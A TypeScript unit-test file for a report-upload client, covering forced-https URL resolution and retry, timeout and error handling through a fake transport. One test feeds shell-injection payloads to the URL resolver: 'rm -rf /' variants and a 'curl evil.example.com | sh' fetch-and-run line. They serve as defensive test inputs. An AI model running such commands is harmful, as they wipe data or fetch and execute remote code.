// D6, RF-AR06: submit-report.js is the opt-in, fire-and-tolerate POST
// client. Unit tests against `submitWithRetries`/`resolveIngestionUrl` with
// an injectable transport, for deterministic retry/timeout/URL-safety
// coverage (the same seam pattern walk-source-tree.js uses for filesystem
// paths no portable fixture can produce). The spawned-process runtime
// harness against the real entrypoint lives in
// submit-report-scenarios.test.ts.
import { EventEmitter } from "node:events";
import { describe, expect, it } from "vitest";
import { resolveIngestionUrl, submitWithRetries } from "../scripts/submit-report.js";

// ---------------------------------------------------------------------------
// Fake transport: mirrors the subset of the https.request(url, options, cb)
// interface postOnce() actually uses (`.on()`, `.end()`, `.destroy()`), so a
// scripted sequence of outcomes can drive the retry state machine without a
// single real socket.
// ---------------------------------------------------------------------------

type ScriptedStep = { status: number } | { error: true } | { hang: true };

// The exact param type postOnce()/submitWithRetries() expect, pulled from
// the production function's own signature rather than duplicated by hand —
// so this fake can never silently drift from what the real transport seam
// requires.
type SubmitOptions = Parameters<typeof submitWithRetries>[0];
type RequestFn = NonNullable<SubmitOptions["requestFn"]>;

function fakeTransport(steps: ScriptedStep[]) {
  let callIndex = 0;
  const requestFn: RequestFn = (_url, _options, callback) => {
    const step = steps[callIndex];
    callIndex += 1;
    const request = new EventEmitter() as unknown as ReturnType<RequestFn>;
    // @ts-expect-error — test double implements only what postOnce() calls.
    request.end = () => {
      if (!step || "hang" in step) return; // never calls back — exercises the timeout path
      if ("error" in step) {
        queueMicrotask(() => request.emit("error", new Error("simulated connect error")));
        return;
      }
      queueMicrotask(() =>
        callback({ statusCode: step.status, resume: () => {} } as unknown as Parameters<
          typeof callback
        >[0]),
      );
    };
    // @ts-expect-error — test double implements only what postOnce() calls.
    request.destroy = () => {};
    return request;
  };
  return { requestFn, callCount: () => callIndex };
}

describe("resolveIngestionUrl (Threat Matrix: argument/env composition)", () => {
  it("forces https: even when the input names another scheme", () => {
    const url = resolveIngestionUrl("http://registry.example.com");
    expect(url.protocol).toBe("https:");
    expect(url.pathname).toBe("/api/v1/reports");
  });

  it("resolves the ingestion path against the given origin", () => {
    const url = resolveIngestionUrl("https://registry.example.com/some/base");
    expect(url.href).toBe("https://registry.example.com/api/v1/reports");
  });

  it.each(["$(rm -rf /)", "; rm -rf / #", "`curl evil.example.com | sh`", "not a url at all", ""])(
    "throws on a shell-injection-shaped payload %j rather than constructing a request",
    (payload) => {
      expect(() => resolveIngestionUrl(payload)).toThrow();
    },
  );
});

describe("submitWithRetries", () => {
  it("succeeds on the first attempt and makes no retry", async () => {
    const { requestFn, callCount } = fakeTransport([{ status: 200 }]);
    const result = await submitWithRetries({
      url: resolveIngestionUrl("https://registry.example.com"),
      token: "t",
      payload: Buffer.from("{}"),
      requestFn,
    });
    expect(result.ok).toBe(true);
    expect(result.attempts).toBe(1);
    expect(callCount()).toBe(1);
  });

  it("retries a 5xx up to the cap, then gives up — never a 4th attempt", async () => {
    const { requestFn, callCount } = fakeTransport([
      { status: 503 },
      { status: 502 },
      { status: 500 },
    ]);
    const result = await submitWithRetries({
      url: resolveIngestionUrl("https://registry.example.com"),
      token: "t",
      payload: Buffer.from("{}"),
      requestFn,
    });
    expect(result.ok).toBe(false);
    expect(result.attempts).toBe(3);
    expect(callCount()).toBe(3);
  });

  it("retries a connect error the same as a 5xx", async () => {
    const { requestFn, callCount } = fakeTransport([{ error: true }, { status: 200 }]);
    const result = await submitWithRetries({
      url: resolveIngestionUrl("https://registry.example.com"),
      token: "t",
      payload: Buffer.from("{}"),
      requestFn,
    });
    expect(result.ok).toBe(true);
    expect(result.attempts).toBe(2);
    expect(callCount()).toBe(2);
  });

  it("never retries a 4xx — one attempt, immediate give-up", async () => {
    const { requestFn, callCount } = fakeTransport([{ status: 400 }, { status: 200 }]);
    const result = await submitWithRetries({
      url: resolveIngestionUrl("https://registry.example.com"),
      token: "t",
      payload: Buffer.from("{}"),
      requestFn,
    });
    expect(result.ok).toBe(false);
    expect(result.attempts).toBe(1);
    expect(callCount()).toBe(1);
    if (!result.ok && result.outcome.kind === "response") expect(result.outcome.status).toBe(400);
  });

  it("stops retrying once the overall budget is exhausted, not per-attempt", async () => {
    const { requestFn, callCount } = fakeTransport([{ error: true }, { error: true }]);
    const result = await submitWithRetries({
      url: resolveIngestionUrl("https://registry.example.com"),
      token: "t",
      payload: Buffer.from("{}"),
      requestFn,
      deadline: Date.now() - 1, // already expired before the first attempt
    });
    expect(result.ok).toBe(false);
    expect(callCount()).toBe(0);
  });
});

// The spawned-process runtime harness for RF-AR06 scenarios 1 and 2 (disabled
// by default, registry down does not fail CI) lives in
// submit-report-scenarios.test.ts, landing together with the workflow wiring
// it validates.
